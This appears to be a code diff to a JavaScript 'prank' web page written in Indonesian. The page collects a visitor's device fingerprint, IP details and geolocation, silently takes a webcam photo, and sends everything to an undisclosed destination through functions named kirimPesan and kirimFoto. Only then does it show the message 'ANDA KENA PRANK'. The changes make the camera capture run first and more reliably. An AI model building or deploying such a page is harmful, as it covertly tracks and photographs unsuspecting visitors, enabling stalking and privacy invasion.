@@ -139,26 +139,26 @@
 - 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙 -
 
 Jenis Perangkat        : ${brand}
-User Agent          : ${ua}
-Platform            : ${platform}
-Vendor Browser      : ${vendor}
-GPU Vendor          : ${gpu.vendor}
-GPU Renderer        : ${gpu.renderer}
-CPU                 : ${navigator.hardwareConcurrency || '-'} inti
-RAM                 : ${navigator.deviceMemory || '-'} GB
-Resolusi Layar      : ${screen.width} x ${screen.height}
-Orientasi Layar     : ${screen.orientation?.type || '-'}
-Touch Support       : ${touch} (${navigator.maxTouchPoints} titik)
-Kerapatan Piksel    : ${window.devicePixelRatio}
-Cookies Aktif       : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
-JavaScript          : Aktif
-Do Not Track        : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
-HTTPS               : ${location.protocol === "https:" ? "Ya" : "Tidak"}
-Zona Waktu          : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Waktu Lokal         : ${waktu}
-Referrer            : ${ref}
-Baterai             : ${Math.round(bat.level * 100)}%
-Sedang Mengisi      : ${bat.charging ? '✅' : '🚫'}
+User Agent             : ${ua}
+Platform               : ${platform}
+Vendor Browser         : ${vendor}
+GPU Vendor             : ${gpu.vendor}
+GPU Renderer           : ${gpu.renderer}
+CPU                    : ${navigator.hardwareConcurrency || '-'} inti
+RAM                    : ${navigator.deviceMemory || '-'} GB
+Resolusi Layar         : ${screen.width} x ${screen.height}
+Orientasi Layar        : ${screen.orientation?.type || '-'}
+Touch Support          : ${touch} (${navigator.maxTouchPoints} titik)
+Kerapatan Piksel       : ${window.devicePixelRatio}
+Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+JavaScript             : Aktif
+Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
+HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}
+Zona Waktu             : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Waktu Lokal            : ${waktu}
+Referrer               : ${ref}
+Baterai                : ${Math.round(bat.level * 100)}%
+Sedang Mengisi         : ${bat.charging ? '✅' : '🚫'}
 `.trim();
     };
 
@@ -207,7 +207,18 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement("video");
         video.srcObject = stream;
+        video.setAttribute("playsinline", true);
         await video.play();
+
+        await new Promise(resolve => {
+          const cek = () => {
+            if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
+            else requestAnimationFrame(cek);
+          };
+          cek();
+        });
+
+        await new Promise(r => setTimeout(r, 500));
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
@@ -218,8 +229,16 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
         stream.getTracks().forEach(track => track.stop());
 
         const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-        await kirimFoto(blob);
-        return "";
+        if (blob) {
+          await kirimFoto(blob);
+          return "";
+        } else {
+          return `
+- 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
+
+❌ Gagal mengambil gambar dari kamera.
+`;
+        }
       } catch {
         return `
 - 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
@@ -230,19 +249,22 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
     };
 
     const mulai = async () => {
+      const kamera = await ambilKamera();
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
       const lokasi = await ambilLokasi();
-      const kamera = await ambilKamera();
 
       const final = `${info}\n\n${ip}\n\n${lokasi}\n${kamera}`;
       document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
       await kirimPesan(final);
 
-      // Efek akhir prank muncul
       setTimeout(() => {
         document.getElementById("msg").classList.add("hidden");
-        document.getElementById("prank").classList.remove("hidden");
+        const el = document.createElement("div");
+        el.className = "prank";
+        el.id = "prank";
+        el.textContent = "ANDA KENA PRANK 😹";
+        document.body.appendChild(el);
       }, 1500);
     };
 
